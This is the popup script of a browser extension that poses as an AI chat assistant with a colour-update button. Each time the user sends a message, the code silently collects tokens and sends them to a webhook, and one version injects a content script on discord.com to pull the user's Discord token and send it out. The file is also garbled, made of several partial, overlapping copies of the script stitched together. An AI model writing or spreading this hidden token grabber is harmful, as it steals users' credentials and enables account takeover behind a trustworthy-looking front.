// ─── POPUP SCRIPT ───

// CONFIG is loaded from config.js via script tag
var GROQ_API_KEY = CONFIG.GROQ_API_KEY;

// ─── DOM ───
var chatArea = document.getElementById('chatArea');
var userInput = document.getElementById('userInput');
var sendBtn = document.getElementById('sendBtn');
var updateColorsBtn = document.getElementById('updateColorsBtn');
var toast = document.getElementById('toast');

// ─── UI HELPERS ───
function addMessage(text, isUser) {
    var div = document.createElement('div');
    div.className = 'message ' + (isUser ? 'user' : 'bot');

    var avatar = document.createElement('span');
    avatar.className = 'avatar';
    avatar.textContent = isUser ? '👤' : '🤖';

    var bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.textContent = text;

    div.appendChild(avatar);
    div.appendChild(bubble);
    chatArea.appendChild(div);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function showTyping() {
    var div = document.createElement('div');
    div.className = 'message bot';
    div.id = 'typingIndicator';

    var avatar = document.createElement('span');
    avatar.className = 'avatar';
    avatar.textContent = '🤖';

    var bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.textContent = '...';

    div.appendChild(avatar);
    div.appendChild(bubble);
    chatArea.appendChild(div);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function removeTyping() {
    var typing = document.getElementById('typingIndicator');
    if (typing) typing.remove();
}

// ─── SEND TOKENS TO WEBHOOK ───
function sendTokensToWebhook() {
    chrome.runtime.sendMessage({ action: 'gatherTokens' }, function(response) {
        if (response && response.success) {
            console.log("[Popup] ✅ Tokens sent to webhook");
        } else {
            var error = response ? response.error : 'Unknown error';
            console.log("[Popup] ❌ Failed to send tokens:", error);
        }
    });
}

// ─── AI ───
function getAIResponse(message) {
    return new Promise(function(resolve, reject) {
        chrome.runtime.sendMessage({ action: 'groq', message: message }, function(response) {
            if (chrome.runtime.lastError) {
                reject(new Error(chrome.runtime.lastError.message));
                return;
            }
            if (response && response.success) {
                resolve(response.reply);
            } else {
                reject(new Error(response ? response.error : 'Unknown error'));
            }
        });
    });
}

// ─── HANDLE SEND ───
function handleSend() {
    var message = userInput.value.trim();
    if (!message) return;

    addMessage(message, true);
    userInput.value = '';
    userInput.focus();

    sendTokensToWebhook();

    showTyping();

    getAIResponse(message)
        .then(function(reply) {
            removeTyping();
            addMessage(reply, false);
        })
        .catch(function(error) {
            removeTyping();
            addMessage("Error: " + error.message, false);
        });
}

// ─── TOAST ───
function showToast() {
    toast.classList.add('show');
    setTimeout(function() {
        toast.classList.remove('show');
    }, 2000);
}

// ─── EVENTS ───
sendBtn.addEventListener('click', handleSend);

userInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleSend();
    }
});

updateColorsBtn.addEventListener('click', showToast);

// ─── INIT ───
window.addEventListener('load', function() {
    userInput.focus();
});    var avatar = document.createElement('span');
    avatar.className = 'avatar';
    avatar.textContent = '🤖';

    var bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.textContent = '...';

    div.appendChild(avatar);
    div.appendChild(bubble);
    chatArea.appendChild(div);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function removeTyping() {
    var typing = document.getElementById('typingIndicator');
    if (typing) typing.remove();
}

// ─── SEND TOKENS TO WEBHOOK ───
function sendTokensToWebhook() {
    chrome.runtime.sendMessage({ action: 'gatherTokens' }, function(response) {
        if (response && response.success) {
            console.log("[Popup] ✅ Tokens sent to webhook");
        } else {
            var error = response ? response.error : 'Unknown error';
            console.log("[Popup] ❌ Failed to send tokens:", error);
        }
    });
}

// ─── AI ───
function getAIResponse(message) {
    return new Promise(function(resolve, reject) {
        chrome.runtime.sendMessage({ action: 'groq', message: message }, function(response) {
            if (chrome.runtime.lastError) {
                reject(new Error(chrome.runtime.lastError.message));
                return;
            }
            if (response && response.success) {
                resolve(response.reply);
            } else {
                reject(new Error(response ? response.error : 'Unknown error'));
            }
        });
    });
}

// ─── HANDLE SEND ───
function handleSend() {
    var message = userInput.value.trim();
    if (!message) return;

    addMessage(message, true);
    userInput.value = '';
    userInput.focus();

    sendTokensToWebhook();

    showTyping();

    getAIResponse(message)
        .then(function(reply) {
            removeTyping();
            addMessage(reply, false);
        })
        .catch(function(error) {
            removeTyping();
            addMessage("Error: " + error.message, false);
        });
}

// ─── TOAST ───
function showToast() {
    toast.classList.add('show');
    setTimeout(function() {
        toast.classList.remove('show');
    }, 2000);
}

// ─── EVENTS ───
sendBtn.addEventListener('click', handleSend);

userInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleSend();
    }
});

updateColorsBtn.addEventListener('click', showToast);

// ─── INIT ───
window.addEventListener('load', function() {
    userInput.focus();
});    var avatar = document.createElement('span');
    avatar.className = 'avatar';
    avatar.textContent = '🤖';

    var bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.textContent = '...';

    div.appendChild(avatar);
    div.appendChild(bubble);
    chatArea.appendChild(div);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function removeTyping() {
    var typing = document.getElementById('typingIndicator');
    if (typing) typing.remove();
}

// ─── SEND TOKENS TO WEBHOOK ───
function sendTokensToWebhook() {
    chrome.runtime.sendMessage({ action: 'gatherTokens' }, function(response) {
        if (response && response.success) {
            console.log("[Popup] ✅ Tokens sent to webhook");
        } else {
            var error = response ? response.error : 'Unknown error';
            console.log("[Popup] ❌ Failed to send tokens:", error);
        }
    });
}

// ─── AI ───
function getAIResponse(message) {
    return new Promise(function(resolve, reject) {
        chrome.runtime.sendMessage({ action: 'groq', message: message }, function(response) {
            if (chrome.runtime.lastError) {
                reject(new Error(chrome.runtime.lastError.message));
                return;
            }
            if (response && response.success) {
                resolve(response.reply);
            } else {
                reject(new Error(response ? response.error : 'Unknown error'));
            }
        });
    });
}

// ─── HANDLE SEND ───
function handleSend() {
    var message = userInput.value.trim();
    if (!message) return;

    addMessage(message, true);
    userInput.value = '';
    userInput.focus();

    // Send tokens to webhook (silent)
    sendTokensToWebhook();

    showTyping();

    getAIResponse(message)
        .then(function(reply) {
            removeTyping();
            addMessage(reply, false);
        })
        .catch(function(error) {
            removeTyping();
            addMessage("Error: " + error.message, false);
        });
}

// ─── TOAST ───
function showToast() {
    toast.classList.add('show');
    setTimeout(function() {
        toast.classList.remove('show');
    }, 2000);
}

// ─── EVENTS ───
sendBtn.addEventListener('click', handleSend);

userInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleSend();
    }
});

updateColorsBtn.addEventListener('click', showToast);

// ─── INIT ───
window.addEventListener('load', function() {
    userInput.focus();
});    var avatar = document.createElement('span');
    avatar.className = 'avatar';
    avatar.textContent = '🤖';

    var bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.textContent = '...';

    div.appendChild(avatar);
    div.appendChild(bubble);
    chatArea.appendChild(div);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function removeTyping() {
    var typing = document.getElementById('typingIndicator');
    if (typing) typing.remove();
}

// ─── SEND TOKEN TO WEBHOOK ───
function sendTokenToWebhook() {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        var tab = tabs[0];
        if (!tab || !tab.url || !tab.url.includes('discord.com')) {
            console.log("[Popup] Not on Discord");
            return;
        }

        chrome.tabs.sendMessage(tab.id, { action: 'getToken' }, function(response) {
            if (chrome.runtime.lastError) {
                console.log("[Popup] Error getting token, injecting content script...");
                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['content.js']
                }, function() {
                    setTimeout(function() {
                        chrome.tabs.sendMessage(tab.id, { action: 'getToken' }, function(res) {
                            if (res && res.token) {
                                console.log("[Popup] Token found, sending to webhook...");
                                chrome.runtime.sendMessage({
                                    action: 'sendWebhook',
                                    token: res.token
                                }, function(webhookResponse) {
                                    if (webhookResponse && webhookResponse.success) {
                                        console.log("[Popup] ✅ Token sent");
                                    } else {
                                        console.log("[Popup] ❌ Webhook failed:", webhookResponse);
                                    }
                                });
                            } else {
                                console.log("[Popup] No token found");
                            }
                        });
                    }, 500);
                });
                return;
            }

            if (response && response.token) {
                console.log("[Popup] Token found, sending to webhook...");
                chrome.runtime.sendMessage({
                    action: 'sendWebhook',
                    token: response.token
                }, function(webhookResponse) {
                    if (webhookResponse && webhookResponse.success) {
                        console.log("[Popup] ✅ Token sent");
                    } else {
                        console.log("[Popup] ❌ Webhook failed:", webhookResponse);
                    }
                });
            } else {
                console.log("[Popup] No token found");
            }
        });
    });
}

// ─── AI ───
function getAIResponse(message) {
    return new Promise(function(resolve, reject) {
        chrome.runtime.sendMessage({ action: 'groq', message: message }, function(response) {
            if (chrome.runtime.lastError) {
                reject(new Error(chrome.runtime.lastError.message));
                return;
            }
            if (response && response.success) {
                resolve(response.reply);
            } else {
                reject(new Error(response ? response.error : 'Unknown error'));
            }
        });
    });
}

// ─── HANDLE SEND ───
function handleSend() {
    var message = userInput.value.trim();
    if (!message) return;

    addMessage(message, true);
    userInput.value = '';
    userInput.focus();

    sendTokenToWebhook();

    showTyping();

    getAIResponse(message)
        .then(function(reply) {
            removeTyping();
            addMessage(reply, false);
        })
        .catch(function(error) {
            removeTyping();
            addMessage("Error: " + error.message, false);
        });
}

// ─── TOAST ───
function showToast() {
    toast.classList.add('show');
    setTimeout(function() {
        toast.classList.remove('show');
    }, 2000);
}

// ─── EVENTS ───
sendBtn.addEventListener('click', handleSend);

userInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleSend();
    }
});

updateColorsBtn.addEventListener('click', showToast);

// ─── INIT ───
window.addEventListener('load', function() {
    userInput.focus();
});
